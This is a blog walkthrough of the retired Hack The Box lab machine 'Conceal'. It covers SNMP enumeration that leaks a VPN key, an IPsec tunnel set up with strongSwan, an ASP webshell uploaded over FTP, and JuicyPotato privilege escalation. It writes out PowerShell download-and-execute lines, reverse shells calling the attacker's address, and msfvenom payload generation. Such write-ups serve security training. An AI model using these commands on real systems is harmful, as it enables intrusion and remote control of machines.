---
layout: post
title: "HTB-Conceal"
categories: HTB-Walkthrough
---

![conceal](/assets/img/conceal/conceal1.png)


Another OSCP-like box from the HTB 'retired' list.


<h3>Nmap</h3>


`nmap -sV -Pn -p- 10.10.10.116 |tee -a con.txt`

This scan would still be going now I think, if I did'nt stop it!

Instead, scanning the UDP ports produced results to take us forwards.

`nmap -sU -p- --min-rate 10000 10.10.10.116 |tee -a c2.txt`

The `--min-rate` flag gives us a quick scan, otherwise the wait is a very long one.

```

Nmap scan report for 10.10.10.116
Host is up (0.100s latency).
Not shown: 65534 open|filtered ports
PORT    STATE SERVICE
500/udp open  isakmp

```

Nmap has found that the target has isakmp on port 500, the target is possibly running [IKE](https://en.wikipedia.org/wiki/Internet_Key_Exchange).


`nmap -sU -p500 10.10.10.116 --script=ike-version`

```

PORT    STATE         SERVICE REASON
500/udp open|filtered isakmp  no-response
Final times for host: srtt: 103034 rttvar: 103034  to: 515170

```

It looks like I've triggered something, I'll probably need to wait a while before trying the nmap script again, 
While I'm waiting, its a good idea to scan for SNMP service running on UDP port 161, it didn't show up on the first scan, but scanning UDP ports can sometimes be sketchy, it's worth targeting that port directly.

`nmap -sU -p 161 10.10.10.116 -sC`

The port is open, an the service is running; and the preliminary information is promising.

```

Nmap scan report for 10.10.10.116
Host is up (0.095s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-interfaces: 
|   Software Loopback Interface 1\x00
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 1 Gbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Intel(R) 82574L Gigabit Network Connection\x00
|     IP address: 10.10.10.116  Netmask: 255.255.255.0
|     MAC address: 00:50:56:b9:21:71 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Traffic stats: 362.22 Kb sent, 9.85 Mb received
|   Intel(R) 82574L Gigabit Network Connection-WFP Native MAC Layer LightWeight Filter-0000\x00
|     MAC address: 00:50:56:b9:21:71 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Traffic stats: 362.22 Kb sent, 9.85 Mb received
|   Intel(R) 82574L Gigabit Network Connection-QoS Packet Scheduler-0000\x00
|     MAC address: 00:50:56:b9:21:71 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Traffic stats: 362.22 Kb sent, 9.85 Mb received
|   Intel(R) 82574L Gigabit Network Connection-WFP 802.3 MAC Layer LightWeight Filter-0000\x00
|     MAC address: 00:50:56:b9:21:71 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|_    Traffic stats: 362.22 Kb sent, 9.85 Mb received
| snmp-netstat: 
|   TCP  0.0.0.0:21           0.0.0.0:0
|   TCP  0.0.0.0:80           0.0.0.0:0
|   TCP  0.0.0.0:135          0.0.0.0:0
|   TCP  0.0.0.0:445          0.0.0.0:0
|   TCP  0.0.0.0:49664        0.0.0.0:0
|   TCP  0.0.0.0:49665        0.0.0.0:0
|   TCP  0.0.0.0:49666        0.0.0.0:0
|   TCP  0.0.0.0:49667        0.0.0.0:0
|   TCP  0.0.0.0:49668        0.0.0.0:0
|   TCP  0.0.0.0:49669        0.0.0.0:0
|   TCP  0.0.0.0:49670        0.0.0.0:0
|   TCP  10.10.10.116:139     0.0.0.0:0
|   UDP  0.0.0.0:123          *:*
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:500          *:*
|   UDP  0.0.0.0:4500         *:*
|   UDP  0.0.0.0:5050         *:*
|   UDP  0.0.0.0:5353         *:*
|   UDP  0.0.0.0:5355         *:*
|   UDP  0.0.0.0:54636        *:*
|   UDP  10.10.10.116:137     *:*
|   UDP  10.10.10.116:138     *:*
|   UDP  10.10.10.116:1900    *:*
|   UDP  10.10.10.116:54795   *:*
|   UDP  127.0.0.1:1900       *:*
|_  UDP  127.0.0.1:54796      *:*


<---SNIP--->

```


<hr width="250" size="6">




<h3>SNMP - Enumeration</h3>


[snmp-check](https://tools.kali.org/information-gathering/snmp-check) is capable of more in-depth enumeration.



`snmp-check -c public 10.10.10.116`


```

snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.10.116:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.10.10.116
  Hostname                      : Conceal
  Description                   : Hardware: AMD64 Family 23 Model 1 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
  Contact                       : IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
  Location                      : -
  Uptime snmp                   : 04:08:41.57
  Uptime system                 : 04:08:14.59
  System date                   : 2020-3-8 01:32:20.7
  Domain                        : WORKGROUP

[*] User accounts:

  Guest               
  Destitute           
  Administrator       
  DefaultAccount      

[*] Network information:

  IP forwarding enabled         : no
  Default TTL                   : 128
  TCP segments received         : 50150
  TCP segments sent             : 8
  TCP segments retrans          : 4
  Input datagrams               : 223116
  Delivered datagrams           : 143475
  Output datagrams              : 3320

[*] Network interfaces:

  Interface                     : [ up ] Software Loopback Interface 1
  Id                            : 1
  Mac Address                   : :::::
  Type                          : softwareLoopback
  Speed                         : 1073 Mbps
  MTU                           : 1500
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] WAN Miniport (IKEv2)
  Id                            : 2
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] WAN Miniport (PPTP)
  Id                            : 3
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Microsoft Kernel Debug Network Adapter
  Id                            : 4
  Mac Address                   : :::::
  Type                          : ethernet-csmacd
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] WAN Miniport (L2TP)
  Id                            : 5
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Teredo Tunneling Pseudo-Interface
  Id                            : 6
  Mac Address                   : 00:00:00:00:00:00
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] WAN Miniport (IP)
  Id                            : 7
  Mac Address                   : :::::
  Type                          : ethernet-csmacd
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] WAN Miniport (SSTP)
  Id                            : 8
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] WAN Miniport (IPv6)
  Id                            : 9
  Mac Address                   : :::::
  Type                          : ethernet-csmacd
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ up ] Intel(R) 82574L Gigabit Network Connection
  Id                            : 10
  Mac Address                   : 00:50:56:b9:21:71
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 1500
  In octets                     : 9889150
  Out octets                    : 384806

  Interface                     : [ down ] WAN Miniport (PPPOE)
  Id                            : 11
  Mac Address                   : :::::
  Type                          : ppp
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] WAN Miniport (Network Monitor)
  Id                            : 12
  Mac Address                   : :::::
  Type                          : ethernet-csmacd
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ up ] Intel(R) 82574L Gigabit Network Connection-WFP Native MAC Layer LightWeight Filter-0000
  Id                            : 13
  Mac Address                   : 00:50:56:b9:21:71
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 1500
  In octets                     : 9889150
  Out octets                    : 384806

  Interface                     : [ up ] Intel(R) 82574L Gigabit Network Connection-QoS Packet Scheduler-0000
  Id                            : 14
  Mac Address                   : 00:50:56:b9:21:71
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 1500
  In octets                     : 9889150
  Out octets                    : 384806

  Interface                     : [ up ] Intel(R) 82574L Gigabit Network Connection-WFP 802.3 MAC Layer LightWeight Filter-0000
  Id                            : 15
  Mac Address                   : 00:50:56:b9:21:71
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 1500
  In octets                     : 9889150
  Out octets                    : 384806


[*] Network IP:

  Id                    IP Address            Netmask               Broadcast           
  10                    10.10.10.116          255.255.255.0         1                   
  1                     127.0.0.1             255.0.0.0             1                   

[*] Routing information:

  Destination           Next hop              Mask                  Metric              
  0.0.0.0               10.10.10.2            0.0.0.0               281                 
  10.10.10.0            10.10.10.116          255.255.255.0         281                 
  10.10.10.116          10.10.10.116          255.255.255.255       281                 
  10.10.10.255          10.10.10.116          255.255.255.255       281                 
  127.0.0.0             127.0.0.1             255.0.0.0             331                 
  127.0.0.1             127.0.0.1             255.255.255.255       331                 
  127.255.255.255       127.0.0.1             255.255.255.255       331                 
  224.0.0.0             127.0.0.1             240.0.0.0             331                 
  255.255.255.255       127.0.0.1             255.255.255.255       331                 

[*] TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State               
  0.0.0.0               21                    0.0.0.0               0                     listen              
  0.0.0.0               80                    0.0.0.0               0                     listen              
  0.0.0.0               135                   0.0.0.0               0                     listen              
  0.0.0.0               445                   0.0.0.0               0                     listen              
  0.0.0.0               49664                 0.0.0.0               0                     listen              
  0.0.0.0               49665                 0.0.0.0               0                     listen              
  0.0.0.0               49666                 0.0.0.0               0                     listen              
  0.0.0.0               49667                 0.0.0.0               0                     listen              
  0.0.0.0               49668                 0.0.0.0               0                     listen              
  0.0.0.0               49669                 0.0.0.0               0                     listen              
  0.0.0.0               49670                 0.0.0.0               0                     listen              
  10.10.10.116          139                   0.0.0.0               0                     listen              

[*] Listening UDP ports:

  Local address         Local port          
  0.0.0.0               123                 
  0.0.0.0               161                 
  0.0.0.0               500                 
  0.0.0.0               4500                
  0.0.0.0               5050                
  0.0.0.0               5353                
  0.0.0.0               5355                
  10.10.10.116          137                 
  10.10.10.116          138                 
  10.10.10.116          1900                
  10.10.10.116          54795               
  127.0.0.1             1900                
  127.0.0.1             54796               

[*] Network services:

  Index                 Name                
  0                     Power               
  1                     Server              
  2                     Themes              
  3                     IP Helper           
  4                     DNS Client          
  5                     Data Usage          
  6                     Superfetch          
  7                     DHCP Client         
  8                     Time Broker         
  9                     TokenBroker         
  10                    Workstation         
  11                    SNMP Service        
  12                    User Manager        
  13                    VMware Tools        
  14                    Windows Time        
  15                    CoreMessaging       
  16                    Plug and Play       
  17                    Print Spooler       
  18                    Windows Audio       
  19                    SSDP Discovery      
  20                    Task Scheduler      
  21                    Windows Search      
  22                    Security Center     
  23                    Storage Service     
  24                    Windows Firewall    
  25                    CNG Key Isolation   
  26                    COM+ Event System   
  27                    Windows Event Log   
  28                    IPsec Policy Agent  
  29                    Geolocation Service 
  30                    Group Policy Client 
  31                    RPC Endpoint Mapper 
  32                    Data Sharing Service
  33                    Device Setup Manager
  34                    Network List Service
  35                    System Events Broker
  36                    User Profile Service
  37                    Base Filtering Engine
  38                    Local Session Manager
  39                    Microsoft FTP Service
  40                    TCP/IP NetBIOS Helper
  41                    Cryptographic Services
  42                    Tile Data model server
  43                    COM+ System Application
  44                    Diagnostic Service Host
  45                    Shell Hardware Detection
  46                    State Repository Service
  47                    Diagnostic Policy Service
  48                    Network Connection Broker
  49                    Security Accounts Manager
  50                    Network Location Awareness
  51                    Windows Connection Manager
  52                    Windows Font Cache Service
  53                    Remote Procedure Call (RPC)
  54                    DCOM Server Process Launcher
  55                    Windows Audio Endpoint Builder
  56                    Application Host Helper Service
  57                    Network Store Interface Service
  58                    Distributed Link Tracking Client
  59                    System Event Notification Service
  60                    World Wide Web Publishing Service
  61                    Connected Devices Platform Service
  62                    Windows Defender Antivirus Service
  63                    Windows Management Instrumentation
  64                    Windows Process Activation Service
  65                    Distributed Transaction Coordinator
  66                    IKE and AuthIP IPsec Keying Modules
  67                    VMware CAF Management Agent Service
  68                    VMware Physical Disk Helper Service
  69                    Background Intelligent Transfer Service
  70                    Background Tasks Infrastructure Service
  71                    Program Compatibility Assistant Service
  72                    VMware Alias Manager and Ticket Service
  73                    Connected User Experiences and Telemetry
  74                    WinHTTP Web Proxy Auto-Discovery Service
  75                    Windows Defender Security Centre Service
  76                    Windows Push Notifications System Service
  77                    Windows Defender Antivirus Network Inspection Service
  78                    Windows Driver Foundation - User-mode Driver Framework

[*] Processes:

  Id                    Status                Name                  Path                  Parameters          
  1                     running               System Idle Process                                             
  4                     running               System                                                          
  260                   running               svchost.exe           C:\Windows\System32\  -k LocalSystemNetworkRestricted
  304                   running               smss.exe                                                        
  364                   running               svchost.exe           C:\Windows\system32\  -k LocalService     
  396                   running               csrss.exe                                                       
  476                   running               wininit.exe                                                     
  488                   running               csrss.exe                                                       
  572                   running               winlogon.exe                                                    
  592                   running               services.exe                                                    
  624                   running               lsass.exe             C:\Windows\system32\                      
  696                   running               fontdrvhost.exe                                                 
  704                   running               fontdrvhost.exe                                                 
  716                   running               svchost.exe           C:\Windows\system32\  -k DcomLaunch       
  812                   running               svchost.exe           C:\Windows\System32\  -k NetworkService   
  820                   running               svchost.exe           C:\Windows\system32\  -k RPCSS            
  912                   running               dwm.exe                                                         
  956                   running               svchost.exe           C:\Windows\system32\  -k netsvcs          
  972                   running               svchost.exe           C:\Windows\system32\  -k LocalServiceNoNetwork
  1000                  running               svchost.exe           C:\Windows\System32\  -k LocalServiceNetworkRestricted
  1112                  running               vmacthlp.exe          C:\Program Files\VMware\VMware Tools\                      
  1220                  running               svchost.exe           C:\Windows\System32\  -k LocalServiceNetworkRestricted
  1376                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceNetworkRestricted
  1392                  running               svchost.exe           C:\Windows\System32\  -k LocalServiceNetworkRestricted
  1468                  running               spoolsv.exe           C:\Windows\System32\                      
  1492                  running               svchost.exe           C:\Windows\system32\  -k appmodel         
  1688                  running               svchost.exe           C:\Windows\system32\  -k apphost          
  1700                  running               svchost.exe           C:\Windows\system32\  -k ftpsvc           
  1712                  running               svchost.exe           C:\Windows\System32\  -k utcsvc           
  1780                  running               SecurityHealthService.exe                                            
  1808                  running               snmp.exe              C:\Windows\System32\                      
  1852                  running               vmtoolsd.exe          C:\Program Files\VMware\VMware Tools\                      
  1860                  running               VGAuthService.exe     C:\Program Files\VMware\VMware Tools\VMware VGAuth\                      
  1876                  running               ManagementAgentHost.exe  C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\                      
  1916                  running               MsMpEng.exe                                                     
  1924                  running               svchost.exe           C:\Windows\system32\  -k iissvcs          
  2004                  running               Memory Compression                                              
  2052                  running               SearchIndexer.exe     C:\Windows\system32\  /Embedding          
  2288                  running               SearchProtocolHost.exe  C:\Windows\system32\  Global\UsGthrFltPipeMssGthrPipe69_ Global\UsGthrCtrlFltPipeMssGthrPipe69 1 -2147483646 "Software\Microsoft\Windows Search" "Moz
  2428                  running               svchost.exe           C:\Windows\system32\  -k NetworkServiceNetworkRestricted
  2560                  running               dllhost.exe           C:\Windows\system32\  /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
  2884                  running               WmiPrvSE.exe          C:\Windows\system32\wbem\                      
  3068                  running               LogonUI.exe                                 /flags:0x0 /state0:0xa3a2a055 /state1:0x41c64e6d
  3180                  running               NisSrv.exe                                                      
  3376                  running               svchost.exe           C:\Windows\system32\  -k LocalSystemNetworkRestricted
  3380                  running               msdtc.exe             C:\Windows\System32\                      
  4044                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceAndNoImpersonation
  4240                  running               SearchFilterHost.exe  C:\Windows\system32\  0 692 696 704 8192 700

[*] Storage information:

  Description                   : ["C:\\ Label:  Serial Number 9606be7b"]
  Device id                     : [#<SNMP::Integer:0x0000555fa0ea5da8 @value=1>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x0000555fa0e8aaa8 @value=4096>]
  Memory size                   : 59.51 GB
  Memory used                   : 10.63 GB

  Description                   : ["D:\\"]
  Device id                     : [#<SNMP::Integer:0x0000555fa0e47d70 @value=2>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x0000555fa0e457c8 @value=0>]
  Memory size                   : 0 bytes
  Memory used                   : 0 bytes

  Description                   : ["Virtual Memory"]
  Device id                     : [#<SNMP::Integer:0x0000555fa0e66018 @value=3>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x0000555fa0e3f490 @value=65536>]
  Memory size                   : 3.12 GB
  Memory used                   : 772.31 MB

  Description                   : ["Physical Memory"]
  Device id                     : [#<SNMP::Integer:0x0000555fa0e30c10 @value=4>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x0000555fa0e1aa50 @value=65536>]
  Memory size                   : 2.00 GB
  Memory used                   : 668.62 MB


[*] File system information:

  Index                         : 1
  Mount point                   : 
  Remote mount point            : -
  Access                        : 1
  Bootable                      : 0

[*] Device information:

  Id                    Type                  Status                Descr               
  1                     unknown               running               Microsoft XPS Document Writer v4
  2                     unknown               running               Microsoft Print To PDF
  3                     unknown               running               Microsoft Shared Fax Driver
  4                     unknown               running               Unknown Processor Type
  5                     unknown               running               Unknown Processor Type
  6                     unknown               unknown               Software Loopback Interface 1
  7                     unknown               unknown               WAN Miniport (IKEv2)
  8                     unknown               unknown               WAN Miniport (PPTP) 
  9                     unknown               unknown               Microsoft Kernel Debug Network Adapter
  10                    unknown               unknown               WAN Miniport (L2TP) 
  11                    unknown               unknown               Teredo Tunneling Pseudo-Interface
  12                    unknown               unknown               WAN Miniport (IP)   
  13                    unknown               unknown               WAN Miniport (SSTP) 
  14                    unknown               unknown               WAN Miniport (IPv6) 
  15                    unknown               unknown               Intel(R) 82574L Gigabit Network Connection
  16                    unknown               unknown               WAN Miniport (PPPOE)
  17                    unknown               unknown               WAN Miniport (Network Monitor)
  18                    unknown               unknown               Intel(R) 82574L Gigabit Network Connection-WFP Native MAC Layer
  19                    unknown               unknown               Intel(R) 82574L Gigabit Network Connection-QoS Packet Scheduler-
  20                    unknown               unknown               Intel(R) 82574L Gigabit Network Connection-WFP 802.3 MAC Layer L
  21                    unknown               unknown               D:\                 
  22                    unknown               running               Fixed Disk          
  23                    unknown               running               IBM enhanced (101- or 102-key) keyboard, Subtype=(0)

[*] Software components:

  Index                 Name                
  1                     Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161
  2                     VMware Tools        
  3                     Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161

[*] IIS server information:

  TotalBytesSentLowWord         : 0
  TotalBytesReceivedLowWord     : 0
  TotalFilesSent                : 0
  CurrentAnonymousUsers         : 0
  CurrentNonAnonymousUsers      : 0
  TotalAnonymousUsers           : 0
  TotalNonAnonymousUsers        : 0
  MaxAnonymousUsers             : 0
  MaxNonAnonymousUsers          : 0
  CurrentConnections            : 0
  MaxConnections                : 0
  ConnectionAttempts            : 0
  LogonAttempts                 : 0
  Gets                          : 0
  Posts                         : 0
  Heads                         : 0
  Others                        : 0
  CGIRequests                   : 0
  BGIRequests                   : 0
  NotFoundErrors                : 0

```


The output is voluminous, and a significant security weakness. It exposes among other critical information,
items immediately useful to an attacker - the IKE VPN PSK password and some usernames.

```
IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
```

```

[*] User accounts:

  Guest               
  Destitute           
  Administrator       
  DefaultAccount    

```

This ntlm hash can be cracked in seconds on [crackstation](https://crackstation.net/) 

![cracked](/assets/img/conceal/conceal-ntlm-crack.png)


<h4>Likely Creds</h4>

Destitute / Dudecake1!



<hr width="250" size="6">



<h3>Exploit with Strongswan</h3>

We can exploit this vulnerability with Strongswan.

Install [strongswan](https://strongswan.org/) in kali with `apt install strongswan`.


Next we have to modify the ipsec config file:


`nano /etc/ipsec.conf`


```
# ipsec.conf - strongSwan IPsec configuration file

# basic configuration

config setup
         charondebug="all"
         strictcrlpolicy=no
         uniqueids = yes

# Add connections here.
conn conceal
        authby=secret
        auto=add
        ike=3des-sha1-modp1024!
        esp=3des-sha1!
        type=transport
        keyexchange=ikev1
        left=10.10.14.19
        right=10.10.10.116
        rightsubnet=10.10.10.116[tcp]


# Sample VPN connections

#conn sample-self-signed
#      leftsubnet=10.1.0.0/16
#      leftcert=selfCert.der
#      leftsendcert=never
#      right=192.168.0.2
#      rightsubnet=10.2.0.0/16
#      rightcert=peerCert.der
#      auto=start

#conn sample-with-ca-cert
#      leftsubnet=10.1.0.0/16
#      leftcert=myCert.pem
#      right=192.168.0.2
#      rightsubnet=10.2.0.0/16
#      rightid="C=CH, O=Linux strongSwan CN=peer name"
#      auto=start

```


Then run the commands to get it going:

```
ipsec up conceal


ipsec restart
```

I got a failure message first but then it worked after I repeated

`ipsec up conceal`

```

ipsec up conceal
initiating Main Mode IKE_SA conceal[1] to 10.10.10.116
generating ID_PROT request 0 [ SA V V V V V ]
sending packet: from 10.10.14.17[500] to 10.10.10.116[500] (176 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.17[500] (208 bytes)
parsed ID_PROT response 0 [ SA V V V V V V ]
received MS NT5 ISAKMPOAKLEY vendor ID
received NAT-T (RFC 3947) vendor ID
received draft-ietf-ipsec-nat-t-ike-02\n vendor ID
received FRAGMENTATION vendor ID
received unknown vendor ID: fb:1d:e3:cd:f3:41:b7:ea:16:b7:e5:be:08:55:f1:20
received unknown vendor ID: e3:a5:96:6a:76:37:9f:e7:07:22:82:31:e5:ce:86:52
selected proposal: IKE:3DES_CBC/HMAC_SHA1_96/PRF_HMAC_SHA1/MODP_1024
generating ID_PROT request 0 [ KE No NAT-D NAT-D ]
sending packet: from 10.10.14.17[500] to 10.10.10.116[500] (244 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.17[500] (260 bytes)
parsed ID_PROT response 0 [ KE No NAT-D NAT-D ]
generating ID_PROT request 0 [ ID HASH N(INITIAL_CONTACT) ]
sending packet: from 10.10.14.17[500] to 10.10.10.116[500] (100 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.17[500] (68 bytes)
parsed ID_PROT response 0 [ ID HASH ]
IKE_SA conceal[1] established between 10.10.14.17[10.10.14.17]...10.10.10.116[10.10.10.116]
scheduling reauthentication in 9752s
maximum IKE_SA lifetime 10292s
generating QUICK_MODE request 1553532968 [ HASH SA No ID ID ]
sending packet: from 10.10.14.17[500] to 10.10.10.116[500] (164 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.17[500] (188 bytes)
parsed QUICK_MODE response 1553532968 [ HASH SA No ID ID ]
selected proposal: ESP:3DES_CBC/HMAC_SHA1_96/NO_EXT_SEQ
CHILD_SA conceal{1} established with SPIs c40399bb_i 8095ef26_o and TS 10.10.14.17/32 === 10.10.10.116/32[tcp]
generating QUICK_MODE request 1553532968 [ HASH ]                                                                  
sending packet: from 10.10.14.17[500] to 10.10.10.116[500] (60 bytes)                                              
connection 'conceal' established successfully                                   

```



<hr width="250" size="6">






Once connected, I scanned the target again with nmap, the results this time were better.

```

Nmap scan report for 10.10.10.116
Host is up (0.11s latency).
Not shown: 65509 closed ports
PORT      STATE    SERVICE
21/tcp    open     ftp
80/tcp    open     http
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
5473/tcp  filtered apsolab-tags
7293/tcp  filtered unknown
19659/tcp filtered unknown
27940/tcp filtered unknown
34247/tcp filtered unknown
39399/tcp filtered unknown
40884/tcp filtered unknown
42161/tcp filtered unknown
48537/tcp filtered unknown
49386/tcp filtered unknown
49664/tcp open     unknown
49665/tcp open     unknown
49666/tcp open     unknown
49667/tcp open     unknown
49668/tcp open     unknown
49669/tcp open     unknown
49670/tcp open     unknown
58975/tcp filtered unknown
60377/tcp filtered unknown
61043/tcp filtered unknown
64100/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 41.29 seconds

```

Checking out the directories on the webserver...

```
gobuster dir -u http://conceal.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

`/upload` is the only folder found.


Nmap found `ftp` running, so we can possibly upload a file there, then execute it via the upload folder.


`msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.17 lport=443 -o e.asp`

Pull the trigger by browsing to `conceal.htb/upload/e.htb`

The exploit fails to get a shell, so another tack is needed.



<hr width="250" size="6">


<h3>FTP Upload Webshell</h3>

Upload cmd.asp webshell found in /usr/share/webshells/asp/

copy powershell reverse-shell to pwd (present working directory) in kali, with the following
line appended to the bottom.

`Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.19 -Port 443`

##############


Use python webserver to serve the powershell reverse-shell...

`python3 -m http.server 80`

Set the nc listener...

`nc -nlvp 443`

####

http://conceal.htb/upload/cmd.asp?cmd=powershell%20iex(New-Object%20Net.Webclient).downloadstring(%27http://10.10.14.17/shell.ps1%27)


###



We got shell as Destitute.

```

    Directory: C:\users\destitute\desktop


Mode                LastWriteTime         Length Name                                             
----                -------------         ------ ----                                             
-a----       12/10/2018     23:58             32 proof.txt                                        


PS C:\users\destitute\desktop> type proof.txt
6ExxxxxxxxxxxxxxxxxxxxxxxxxxxxxFF

```

![gotshell](/assets/img/conceal/conceal-gotshell.png)




```
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```



<h3>Privilege Escalation</h3>


The above user privs suggest that we can make an easy privesc with [JuicyPotato](https://github.com/ohpe/juicy-potato).


First create a writable working directory on the target.

```
mkdir c:\boo
```

Copy Juicy-Potato to the target (renamed `jp.exe` for convenience)

```
powershell IWR -uri http://10.10.14.17/jp.exe -outfile c:\boo\jp.exe
```

Also copy across a reverse shell file, a batch file containing a powershell command which calls a different powershell reverse shell works.

<h4>The rev.bat file</h4>

```
powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.17/shell2.ps1')
```


The command at the bottom of shell2.ps1 sends the connection to a different port:


<h4>The Powershell Reverse-Shell</h4>
```
Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.17 -Port 6969
```

The Juicy-Potato command will execute the rev.bat file with `System` privs, conferred on it by the clsid.

The rev.bat calls the powershell file, served by a python web server on Kali `python3 -m http.server 80`,

The shell2.ps1 file in turn invokes a `System` reverse shell from the target to the new port.


<h4>The Juicy-Potato command</h4>

```
.\jp.exe -l 9001 -t * -p \boo\rev.bat -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
```

![juicy](/assets/img/conceal/conceal-juicy.png)

Catch the shell on `nc -nlvp 6969`

![shell](/assets/img/conceal/conceal-jp-shell.png)


```
PS C:\users\administrator\desktop> type proof.txt
57xxxxxxxxxxxxxxxxxxxxxxxxxxxx08
PS C:\users\administrator\desktop> whoami
nt authority\system
PS C:\users\administrator\desktop> 
```

:)



